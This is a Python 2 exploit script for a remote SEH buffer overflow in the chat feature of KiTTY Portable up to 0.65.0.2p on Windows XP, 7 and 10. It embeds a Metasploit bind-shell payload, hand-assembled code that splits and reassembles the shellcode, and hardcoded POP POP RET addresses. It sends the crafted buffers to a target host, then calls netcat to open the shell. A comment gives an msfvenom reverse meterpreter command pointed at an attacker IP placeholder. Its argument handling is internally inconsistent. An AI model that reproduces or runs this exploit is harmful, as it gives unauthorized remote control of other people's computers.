import socket, os, time, sys, struct
 
print "\nKiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)"
 
if len(sys.argv) < 3:
        print "\nUsage: kitty_chat.py <IP> <winxp|win7|win10> [no_nc|local_nc]"
        print "Example: kitty_chat.py 192.168.135.130 win7"
        print "\n Optional argument:"
        print "- 'no_nc' (no netcat), prevents the exploit from starting netcat."
        print "Useful if you are using your own shellcode."
        print "- 'local_nc (local netcat), binds netcat on local port 4444."
        print "Useful if you are using a classic reverse shell shellcode."
        sys.exit()
 
host = sys.argv[1] # Remote target
port  = int(sys.argv[2]) # PORT
win  = sys.argv[3] # OS
 
# If argument "no_nc" specified, do not start netcat at the end of the exploit
# If argument "local_nc" specified, bind netcat to local port 4444
# By default netcat will connect to remote host on port 4444 (default shellcode is a bind shell)
netcat = "remote"
if len(sys.argv) == 5:
        if   sys.argv[3] == "no_nc":
                netcat = "disabled"
        elif sys.argv[3] == "local_nc":
                netcat = "local"
        else:
                print "Unknown argument: %s" % sys.argv[3]
                sys.exit()
 
# Destination address, will be used to calculate dst addr copy from ECX + 0x0006EEC6
relative_jump = 0x112910E8      # = 0x0006EEC6 + 0x11222222     ; avoid NULLs
slice_size    = 118
 
# OS buffer alignement
# buffer length written to memory at time of crash
if   win == "win7":
        offset = 180
elif win == "win10":
        offset = 196
elif win == "winxp":
        offset = 160
        slice_size = 98         # buffer smaller on XP, slice size must be reduced
else:
        print "Unknown OS selected: %s" % win
        print "Please choose 'winxp', 'win7' or 'win10'"
        sys.exit()
 
# Shellcode choice: below is a Metasploit bind shell of 350 bytes. However I have tested successfully
# a Metasploit meterpreter reverse RC4 shell of 850 bytes (encoded with x86/alpha_mixed) on Windows XP where the buffer
# is the smallest. The shellcode was cut into 9 slices and worked perfectly :-) The same works of course
# for Windows 7 and Windows 10, where I tested successfully a Metasploit HTTPS reverse shell of 1178 bytes  
# (encoded with x86/alpha_mixed), which was cut into 10 slices. To generate such shellcode:
# msfvenom -p windows/meterpreter/reverse_https LHOST=YOUR_ATTACKER_IP LPORT=4444 -e x86/alpha_mixed -b '\x00\x0a\x0d\xff' -f c
 
# Metasploit Bind Shell 4444
# Encoder: x86/fnstenv_mov
# Bad chars: '\x00\x0a\x0d\xff'
# Size: 350 bytes
shellcode = (
"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0e\xf9"
"\xa7\x68\x83\xeb\xfc\xe2\xf4\xf2\x11\x25\x68\x0e\xf9\xc7\xe1"
"\xeb\xc8\x67\x0c\x85\xa9\x97\xe3\x5c\xf5\x2c\x3a\x1a\x72\xd5"
"\x40\x01\x4e\xed\x4e\x3f\x06\x0b\x54\x6f\x85\xa5\x44\x2e\x38"
"\x68\x65\x0f\x3e\x45\x9a\x5c\xae\x2c\x3a\x1e\x72\xed\x54\x85"
"\xb5\xb6\x10\xed\xb1\xa6\xb9\x5f\x72\xfe\x48\x0f\x2a\x2c\x21"
"\x16\x1a\x9d\x21\x85\xcd\x2c\x69\xd8\xc8\x58\xc4\xcf\x36\xaa"
"\x69\xc9\xc1\x47\x1d\xf8\xfa\xda\x90\x35\x84\x83\x1d\xea\xa1"
"\x2c\x30\x2a\xf8\x74\x0e\x85\xf5\xec\xe3\x56\xe5\xa6\xbb\x85"
"\xfd\x2c\x69\xde\x70\xe3\x4c\x2a\xa2\xfc\x09\x57\xa3\xf6\x97"
"\xee\xa6\xf8\x32\x85\xeb\x4c\xe5\x53\x91\x94\x5a\x0e\xf9\xcf"
"\x1f\x7d\xcb\xf8\x3c\x66\xb5\xd0\x4e\x09\x06\x72\xd0\x9e\xf8"
"\xa7\x68\x27\x3d\xf3\x38\x66\xd0\x27\x03\x0e\x06\x72\x02\x06"
"\xa0\xf7\x8a\xf3\xb9\xf7\x28\x5e\x91\x4d\x67\xd1\x19\x58\xbd"
"\x99\x91\xa5\x68\x1f\xa5\x2e\x8e\x64\xe9\xf1\x3f\x66\x3b\x7c"
"\x5f\x69\x06\x72\x3f\x66\x4e\x4e\x50\xf1\x06\x72\x3f\x66\x8d"
"\x4b\x53\xef\x06\x72\x3f\x99\x91\xd2\x06\x43\x98\x58\xbd\x66"
"\x9a\xca\x0c\x0e\x70\x44\x3f\x59\xae\x96\x9e\x64\xeb\xfe\x3e"
"\xec\x04\xc1\xaf\x4a\xdd\x9b\x69\x0f\x74\xe3\x4c\x1e\x3f\xa7"
"\x2c\x5a\xa9\xf1\x3e\x58\xbf\xf1\x26\x58\xaf\xf4\x3e\x66\x80"
"\x6b\x57\x88\x06\x72\xe1\xee\xb7\xf1\x2e\xf1\xc9\xcf\x60\x89"
"\xe4\xc7\x97\xdb\x42\x57\xdd\xac\xaf\xcf\xce\x9b\x44\x3a\x97"
"\xdb\xc5\xa1\x14\x04\x79\x5c\x88\x7b\xfc\x1c\x2f\x1d\x8b\xc8"
"\x02\x0e\xaa\x58\xbd"
)
# ###############################################################################
# ** Shellcode Slicer **
# ###############################################################################
# Slice our shellcode in as many parts as necessary
count      = 1
position   = 0
remaining  = len(shellcode)
slice      = []
total_size = 0
 
counter = 0
while position < len(shellcode):
        if remaining > (slice_size - 1):
                slice.append(shellcode[position:slice_size*count])
                position = slice_size * count
                remaining = len(shellcode) - position
                count += 1
        else: # last slice
                slice.append(shellcode[position:position+remaining] + '\x90' * (slice_size - remaining))
                position = len(shellcode)
                remaining = 0
 
                # If shellcode size is less than 256 bytes (\xFF), two slices only are required. However the jump
                # to shellcode being on 2 bytes, it would insert a NULL (e.g \xFE\x00). In this case we simply
                # add a NOP slice to keep this shellcode slicer generic.
                if len(shellcode) < 256:
                        slice.append('\x90' * slice_size)
                        total_size += slice_size
 
        # Keep track of whole slices size, which may be greater than original shellcode size
        # if padding is needed for the last slice. Will be used to calculate a jump size later
        total_size += len(slice[counter])
 
         
# ###############################################################################
# ** Buffer Builder **
# ###############################################################################
# Prepare as many buffers as we have shellcode slices
seh     = '\x36\x31\x4B\x00'                            # 0x004B3136 / POP POP RET / kitty_portable.exe 0.65.0.2p
#seh    = '\x43\x82\x4B\x00'                            # 0x004B8243 / POP POP RET / kitty_portable.exe 0.63.2.2p
#seh    = '\x0B\x34\x49\x00'                            # 0x0049340B / POP POP RET / kitty_portable.exe 0.62.1.2p
nseh    = '\x90' * 4                                    # will be calculated later
junk    = '\x41' * 58
endmark = '\x43' * 5                                    # used to mark end of slice
buffer  = []
 
for index in range(len(slice)):
        # Slice end marker, to stop copy once reached   # mov edi,0x4343XXXX
        shellcode_end = '\xBF' + slice[index][slice_size-2:slice_size] + '\x43\x43'
 
        shell_copy = ( # 51 bytes
        # Calculate shellcode src & dst address
        '\x8B\x5C\x24\x08'                              # mov ebx,[esp+8]       ; retrieve nseh address
        )
 
        if index < (len(slice) - 1):
                                                        # sub bl,0xB2           ; calculate shellcode position from nseh
                shell_copy += '\x80\xEB' + struct.pack("<B", slice_size + len(endmark) + 51 + len(nseh))            
        else: # last slice      
                                                        # sub bl,0xB1           ; calculate shellcode position from nseh
                shell_copy += '\x80\xEB' + struct.pack("<B", slice_size + len(endmark) + 50 + len(nseh))            
 
        # In this exploit we retrieve an address from the main process memory, using ECX. This will be used below to calculate
        # shellcode destination. On other exploits, it may be necessary to use another register (or even to hardcode the address)
        shell_copy += (
        '\x89\xCE'                                      # mov esi,ecx           ; retrieve main process memory address
        '\x31\xC9'                                      # xor ecx,ecx           ; will store the increment
        )
 
        # Calculate shellcode destination relative to memory address retrieved above. As we ADD an address having NULLs
        # we store a non NULL address instead, that we SUB afterwards in the register itself
        if index > 0:                                   # add esi,0x1117FED7 (+118 * x)
                shell_copy += '\x81\xC6' + struct.pack("<I", relative_jump + (slice_size * index))
        else: # first slice
                shell_copy += '\x81\xC6' + struct.pack("<I", relative_jump)
 
        shell_copy += (
        '\x81\xEE\x22\x22\x22\x11'                      # sub esi,0x11222222    ; calculate shellcode destination
        )
 
        shell_copy += shellcode_end                     # mov edi,0x4343XXXX    ; shellcode end mark
         
        shell_copy += (
        # Shellcode copy loop
        '\x83\xC1\x04'                                  # add ecx, 0x4          ; increment counter
        '\x83\xC6\x04'                                  # add esi, 0x4          ; increment destination
        '\x8B\x14\x0B'                                  # mov edx,[ebx+ecx]     ; put shell chunk into edx
        '\x89\x16'                                      # mov [esi],edx         ; copy shell chunk to destination
        '\x39\xFA'                                      # cmp edx,edi           ; check if we reached shellcode end mark (if yes set ZF = 1)
        '\x75\xF1'                                      # jne short -13         ; if ZF = 0, jump back to increment ecx
        )
 
        if index < (len(slice) - 1):
                shell_copy += ( # infinite loop
                '\x90\x90\x90\x90'                      # nop nop nop nop       ; infinite loop
                '\xEB\xFA\x90\x90'                      # jmp short -0x4        ; infinite loop
                )
        else: # last slice
                                                        # sub si,0x160          ; prepare jump address: sub len(slices)
                shell_copy += '\x66\x81\xEE' + struct.pack("<H", total_size - 2)
 
                shell_copy += (
                '\x56'                                  # push esi              ; store full shellcode address on stack
                '\xC3'                                  # ret                   ; jump to shellcode (we cannot us JMP or CALL as \xFF is a bad char)
                )
                                                        # jmp short -len(shell_copy)
        nseh    = '\xEB' + struct.pack("<B", 254 - len(shell_copy)) + '\x90\x90'
        padding = '\x42' * (offset - len(slice[index]) - len(endmark) - len(shell_copy))
         
        buffer.append(junk + padding + slice[index] + endmark + shell_copy + nseh + seh)
 
         
# ###############################################################################
# ** Slice Launcher **
# ###############################################################################
# Send all of our buffers to the target!
sock = []
print "[*] Connecting to %s" % host
for index in range(len(buffer)):
        sock.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        try:
                sock[index].connect((host, port))
                time.sleep(1)
                print "[*] Sending evil buffer%d... (slice %d/%d)" % (index+1, index+1, len(buffer))
                sock[index].send(buffer[index])
                time.sleep(1)
                sock[index].close()
                time.sleep(2)
 
                if index == (len(buffer) - 1):
                        if   netcat == "disabled":
                                print "[*] Done."
                        elif netcat == "local":
                                print "\n[*] Waiting for our shell!"
                                os.system("nc -nlvp 4444")
                        elif netcat == "remote": # default
                                print "\n[*] Connecting to our shell..."
                                time.sleep(2)
                                os.system("nc -nv " + host + " 4444")
        except:
                print "[-] Error sending buffer"
